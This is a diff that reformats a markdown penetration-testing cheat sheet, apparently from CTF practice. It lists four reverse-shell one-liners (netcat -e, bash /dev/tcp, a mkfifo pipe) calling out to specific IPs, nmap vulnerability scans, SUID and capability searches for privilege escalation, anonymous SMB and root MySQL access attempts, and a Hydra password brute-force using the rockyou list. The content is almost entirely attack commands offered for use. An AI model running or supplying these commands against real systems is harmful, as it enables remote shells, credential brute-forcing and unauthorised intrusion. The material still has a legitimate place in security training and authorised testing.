@@ -1,36 +1,43 @@
 # Reverse_shell ✅
-```shell
+```bash
 nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
 /bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
 # Nmap_enumeration ✅
-```shell
+```bash
 sudo nmap -p- <ip> -sV -T5
 sudo nmap -p- <ip> -sV -T5 -Pn
 sudo nmap 139,445 <ip> -sV -T5 --script=vuln
 sudo nmap -p 139,445 <ip> -sV -T5 --script=vuln -Pn
 ```
-SUID_SGID_Capabilities_Files_enumeration  ✅
+# SUID_SGID_Capabilities_Files_enumeration ✅
+```
 getcap -r / 2>/dev/null 
 find /  -perm -04000 -ls 2>/dev/null
 find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
+```
 ———————————————
-SMB✅
+# SMB ✅
+```bash
 enum4linux -a
 smbclient -L //<ip>/ -p <port>
 smbget -R smb://<ip>/<share>
 smbclient //<ip>/<share dir> 
 smbclient //<ip>/<share dir> -p <port>
 smbclient //<ip>/<share dir> -U Anonymous -p <port>
+```
 ———————————————
-MySQL ✅
-*enumeration ✡️
+# MySQL ✅
+## *enumeration ✡️
+```bash
 mysql -u root
 mysql -u root -p
 mysql -h <Hostname> -u root
-*MySQL commands ✡️
+```
+## *MySQL commands ✡️
+```mysql
 show databases;
 use <database>;
 connect <database>;
@@ -41,6 +48,7 @@ SELECT VERSION();
 select * from <table>;
 
 SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
+```
 ———————————————
 Hydra Attack Type Cheat Sheet ✅
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
